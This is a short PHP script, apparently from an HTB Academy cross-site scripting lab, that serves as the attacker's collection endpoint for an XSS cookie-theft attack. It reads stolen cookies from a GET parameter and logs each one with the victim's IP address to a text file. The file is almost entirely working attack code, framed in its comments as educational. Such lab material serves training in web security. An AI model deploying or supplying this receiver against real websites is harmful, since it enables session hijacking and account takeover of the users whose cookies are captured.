
<?php
/**
 * From htb academy xss module.
 * XSS Cookie Capture Script
 * 
 * This script is designed for educational/testing purposes to demonstrate
 * how stolen cookies can be captured during XSS attacks.
 * 
 * Usage: This script expects cookies to be sent via GET parameter 'c'
 * Example: http://example.com/index.php?c=cookie1;cookie2;cookie3
 */

// Check if cookies parameter 'c' is provided in GET request
if (isset($_GET['c'])) {
    // Split multiple cookies separated by semicolons
    $list = explode(";", $_GET['c']);
    
    // Process each cookie in the list
    foreach ($list as $key => $value) {
        // URL decode the cookie value to handle encoded characters
        $cookie = urldecode($value);
        
        // Open cookies.txt file in append mode (create if doesn't exist)
        $file = fopen("cookies.txt", "a+");
        
        // Write victim's IP address and captured cookie to file
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        
        // Close the file handle
        fclose($file);
    }
}
?>